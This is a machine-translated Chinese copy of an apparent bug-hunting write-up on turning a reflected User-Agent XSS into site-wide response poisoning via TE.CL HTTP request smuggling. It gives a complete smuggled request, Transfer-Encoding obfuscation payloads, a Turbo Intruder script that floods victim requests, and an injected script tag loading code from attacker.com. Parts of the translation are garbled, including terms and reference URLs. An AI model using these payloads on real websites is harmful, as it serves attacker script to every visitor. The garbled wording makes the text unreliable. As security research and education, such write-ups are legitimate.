<html>
<head>
<title>Exploiting HTTP Request Smuggling (TE.CL)— XSS to website takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用HTTP请求走私(TE。CL)— XSS将接管网站</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-http-request-smuggling-te-cl-xss-to-website-takeover-c0fc634a661b?source=collection_archive---------1-----------------------#2021-03-09">https://infosecwriteups.com/exploiting-http-request-smuggling-te-cl-xss-to-website-takeover-c0fc634a661b?source=collection_archive---------1-----------------------#2021-03-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/cfab7d78a30d0e17635dccf3fadc8eef.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1r8fNFpivQXcQjKINiYkQg.jpeg"/></div></div></figure><p id="fec3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">尽管HTTP请求走私早在2005年就有记录，但它仍然是最不为人知的Webapp漏洞之一。</p><p id="d816" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">休息了一会儿后，我决定去找一家私人公司(它没有资格获得Bug赏金，但仍然接受报告)，我发现的东西可能值得分享。</p><h1 id="d342" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">在用户代理标头中反映XSS</h1><p id="c053" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">我已经开发了自己的智能XSS模糊化(可能很快就会发布)，它测试URL端点和HTTP头。幸运的是，它发现用户代理正在被反映。我们可以通过使用Burp Suite手动发送请求来确认:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/930894a5cdfe475f87fe2b3656ef4c01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M_stlWovazY6bcg702cbPQ.jpeg"/></div></div></figure><p id="f262" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">单词<em class="me"> Exploitation </em>正在被反映，我们放一个简单的XSS，断开Javascript字符串。有效载荷将如下所示:</p><blockquote class="mf mg mh"><p id="da80" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated">" &gt;<script>警报(` XSS`) </script></p></blockquote><p id="0432" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们得到了XSS，没有什么新的和有趣的。大多数私有程序不接受这个错误，因为在真实情况下，你不能发送特制的HTTP请求给最终用户。让我们试着把这个看起来天真无邪的XSS升级成更辛辣的东西。</p><h1 id="be07" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">侦察和检测HTTP请求走私</h1><p id="0473" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">Burp Suite有一个针对这种类型的漏洞的内置扩展，在我枚举时，它确实测试了任何类型的走私。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/a5eab76ffe9f7bd1d1c7a1d34aa03835.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WMItqq0i4OSHlL3q4ce7VQ.png"/></div></figure><p id="d8c2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在让我们执行自动扫描，进入<strong class="ka ir">中继器</strong>，右击并点击<strong class="ka ir">发射走私探测器</strong>。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/640bf9218fa324fcd39d495be22cb30c.png" data-original-src="https://miro.medium.com/v2/resize:fit:548/format:webp/1*HuthN9dwqT5dvK_Ydu6s4w.png"/></div></figure><p id="ea3c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果检测到HTTP走私漏洞，将在<strong class="ka ir">目标</strong>选项卡上发布(在后台执行扫描可能需要几分钟)</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/33a9a758148b6dca40b56cb929fff9c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:556/format:webp/1*-uByNsDX3Mr5056RZkc1uw.png"/></div><figcaption class="mo mp gj gh gi mq mr bd b be z dk translated">取自<a class="ae ms" href="https://hipotermia.pw/bb/http-desync-account-takeover" rel="noopener ugc nofollow" target="_blank">此处</a>因为忘记截图了</figcaption></figure><h1 id="f13d" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated"><strong class="ak">忒。CL Exploit开发</strong></h1><p id="1028" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">在我们在Burp Suite中创建特殊请求之前，请转到Repeater菜单，确保“<em class="me">更新内容长度</em>”选项未被选中，这样我们的内容长度值不会因Burp Suite而自动改变，这是此类利用的关键部分。</p><p id="cbea" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">下面是我们精心制作的有效载荷。请记住，必须始终包括两个头部(<em class="me">传输编码</em>和<em class="me">连接</em>)。第一个块(A*1000)将被请求到前端服务器，它不包含任何恶意内容，因为它只是一个普通用户会做的常规请求。Content-length之所以是1007(下图中是1005，哎呀……)，是因为有1000个*A + \r\n + 3e8 + b0。这意味着1000 + 2 + 3 + 2 = 1007个字节。注意:b0仍然被认为是第一个请求的一部分，即使它定义了被走私请求的长度。</p><p id="4552" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">第二块数据是我们的走私请求，如果成功，我们应该得到错误404请求，因为网站上没有目录<strong class="ka ir">/404希望是</strong>。</p><p id="fb67" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在第二个块之后，强制添加x=1或一串随机数据和两个换行符<strong class="ka ir"> \r\n\r\n在0之后</strong>。</p><p id="3b19" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b"><em class="me">0\r\n\r\n<br/>\r\n\r\n</em></code></p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/0087b3ed721fcda5f02b19d7f1d584e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1388/format:webp/1*vO8vcAcB4AfDjCSvBFJY-g.jpeg"/></div></figure><p id="11bb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">将此请求发送到Turbo-intrusor，如果我们收到任何404请求，这意味着我们特制的请求被发送到后端服务器。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/75bc0e9c53dc9e95c8e4a09dd1997436.png" data-original-src="https://miro.medium.com/v2/resize:fit:598/format:webp/1*WtmzjvOS7UP-Ban2bQo5lA.png"/></div><figcaption class="mo mp gj gh gi mq mr bd b be z dk translated">请求在后端服务器上运行并产生404错误</figcaption></figure><h1 id="d147" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">后缀空格旁路-模糊TE头</h1><p id="82cb" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">我们必须混淆te报头，因为可以诱导其中一个服务器不处理它。这种技术在相当多的系统上有效，但是我们可以通过使传输编码头更难被发现来利用更多的技术，这样一个系统就看不到它了。以下是詹姆斯·凯特尔的一些有效载荷:</p><blockquote class="mf mg mh"><p id="5141" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">Transfer-Encoding: xchunked</code></p><p id="a9f8" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">Transfer-Encoding : chunked</code></p><p id="e2e2" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">Transfer-Encoding: chunked<br/>Transfer-Encoding: x</code></p><p id="aaf3" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">Transfer-Encoding:[tab]chunked</code></p><p id="c060" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">Transfer-Encoding: chunked</code></p><p id="6275" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">X: X[\n]Transfer-Encoding: chunked</code></p><p id="b377" class="jy jz me ka b kb kc kd ke kf kg kh ki mi kk kl km mj ko kp kq mk ks kt ku kv ij bi translated"><code class="fe mt mu mv mw b">Transfer-Encoding<br/> : chunked</code></p></blockquote><p id="3b2f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我使用空白作为旁路方法。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/9b3338977f2beae59249f1996437b26e.png" data-original-src="https://miro.medium.com/v2/resize:fit:980/format:webp/1*FdNCO994ZtOwLEuKfRn9iA.png"/></div><figcaption class="mo mp gj gh gi mq mr bd b be z dk translated">空格后缀旁路</figcaption></figure><h1 id="0018" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated"><strong class="ak">中毒响应和网站接管</strong></h1><p id="a633" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">我已经创建了一个python脚本，它可以自动处理请求。它还可以计算文本块和内容长度。你可以在这里查看:<a class="ae ms" href="https://github.com/kleiton0x00/TECL_DesyncCalculator" rel="noopener ugc nofollow" target="_blank">https://github.com/kleiton0x00/TECL_DesyncCalculator</a></p><p id="b9af" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">注意:</strong>我稍微编辑了脚本，添加了下面一行，这样我们可以在用户代理头中注入我们的XSS:<br/><code class="fe mt mu mv mw b">prefix += 'User-Agent: "&gt;&lt;script src=http://attacker.com/script.js&gt;&lt;/script&gt;' + RN</code></p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi na"><img src="../Images/d86f50fb39421b6a8d251822c2764bcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iNfeoS0jUIEgSiwnw4S-Mg.jpeg"/></div></div></figure><p id="f16e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因此，输出是我们的请求，我将是我们的最终有效负载，以毒化用户的响应(我也想添加1000*A，只是为了让它更酷):</p><pre class="ma mb mc md gt nb mw nc nd aw ne bi"><span id="9bb9" class="nf kx iq mw b gy ng nh l ni nj">GET / HTTP/1.1<br/>Transfer-Encoding : chunked<br/>Host: private.website<br/>Content-length: 4<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36<br/>Accept-Encoding: gzip, deflate<br/>Connection: keep-alive<br/>Content-Type: application/x-www-form-urlencoded</span><span id="5f0f" class="nf kx iq mw b gy nk nh l ni nj">3e8<br/>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span id="9f35" class="nf kx iq mw b gy nk nh l ni nj">83<br/>GET / HTTP/1.1<br/>Host: private.website<br/>User-Agent: “&gt;&lt;script src=http://attacker.com/script.js&gt;&lt;/script&gt;<br/>Content-Length: 15</span><span id="22e9" class="nf kx iq mw b gy nk nh l ni nj">x=1<br/>0</span></pre><p id="a6da" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在<strong class="ka ir"> script.js里面</strong>是一个简单的代码，它生成一个作为POC的HTML网站(有点像一个DOM XSS):</p><pre class="ma mb mc md gt nb mw nc nd aw ne bi"><span id="a847" class="nf kx iq mw b gy ng nh l ni nj">document.documentElement.innerHTML=String.fromCharCode(60, 104, 116, 109, 108, 62, 10, 60, 104, 49, 62, 85, 115, 101, 114, 39, 115, 32, 114, 101, 115, 112, 111, 110, 115, 101, 32, 105, 115, 32, 112, 111, 105, 115, 111, 110, 101, 100, 32, 119, 105, 116, 104, 32, 72, 84, 84, 80, 32, 82, 101, 113, 117, 101, 115, 116, 32, 83, 109, 117, 103, 103, 108, 105, 110, 103, 32, 97, 110, 100, 32, 88, 83, 83, 60, 47, 104, 49, 62, 10, 60, 47, 104, 116, 109, 108, 62, 10)</span></pre><p id="54ef" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这里是我们的<strong class="ka ir"> setup.txt </strong>，其中包含涡轮入侵者的配置部分:</p><pre class="ma mb mc md gt nb mw nc nd aw ne bi"><span id="3e06" class="nf kx iq mw b gy ng nh l ni nj">#credits to https://hipotermia.pw/bb/http-desync-account-takeover<br/>def queueRequests(target, wordlists):<br/>    engine = RequestEngine(endpoint=target.endpoint,<br/>                           concurrentConnections=20,<br/>                           requestsPerConnection=20,<br/>                           resumeSSL=False,<br/>                           timeout=10,<br/>                           pipeline=False,<br/>                           maxRetriesPerRequest=0<br/>                           )<br/>    engine.start()<br/>    <br/>    attack = target.req<br/>    engine.queue(attack)<br/>    <br/>    victim = target.req<br/>    for i in range(100000000):<br/>        engine.queue(victim)<br/>        time.sleep(0.05)<br/>        <br/>def handleResponse(req, interesting):<br/>    table.add(req)</span></pre><p id="ec8c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">没什么可做的了，所以发动<a class="ae ms" href="https://github.com/PortSwigger/turbo-intruder/releases/tag/1.2.0" rel="noopener ugc nofollow" target="_blank">涡轮入侵者</a>毒害每个人:</p><pre class="ma mb mc md gt nb mw nc nd aw ne bi"><span id="22e5" class="nf kx iq mw b gy ng nh l ni nj">java -jar turbo-intruder-all.jar setup.txt request.txt https://www.target.com/ /</span></pre><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/012438971585ef6d44811e8ed4f6f50b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4ZBYWE8VVbdPg090oNTN-g.jpeg"/></div></div></figure><p id="dcc4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">只要涡轮入侵者还在运行，XSS的有效载荷就会一直留在网站上。下面是在网站中执行的Javascript。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/18158223adc4958a2e2596892ca0f4ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sNy8N8Q_DzAWnE82n8BOCw.jpeg"/></div></div><figcaption class="mo mp gj gh gi mq mr bd b be z dk translated">用户的响应中毒</figcaption></figure><h1 id="c38d" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">参考资料:</h1><p id="9532" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated"><a class="ae ms" href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" rel="noopener ugc nofollow" target="_blank">https://ports wigger . net/research/http-desync-attacks-request-走私-投胎</a><br/>T3】https://portswigger.net/web-security/request-smuggling<a class="ae ms" href="https://www.youtube.com/watch?v=JW2fM_GmidU&amp;t=1s" rel="noopener ugc nofollow" target="_blank"><br/>https://www.youtube.com/watch?v=JW2fM_GmidU&amp;t = 1s</a></p></div></div>    
</body>
</html>